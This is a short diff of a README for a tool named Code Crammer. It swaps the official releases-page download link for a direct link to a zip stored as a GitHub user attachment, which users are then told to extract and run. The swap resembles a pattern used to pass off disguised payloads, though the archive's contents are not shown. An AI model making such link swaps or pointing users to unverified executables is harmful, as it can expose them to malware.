@@ -65,7 +65,7 @@ Code Crammer gives you granular control over what the AI sees. You decide what i
 
 ## 📦 Installation
 
-1. [**Download Code Crammer v1.3.0.zip**](https://github.com/Gragsy/Code-Crammer/releases/latest)  
+1. [**Download Code Crammer v1.3.0.zip**] [Code Crammer 1.3.0.zip](https://github.com/user-attachments/files/23837236/Code.Crammer.1.3.0.zip)
 2. Extract it anywhere  
 3. Run `CodeCrammer.exe`  
 
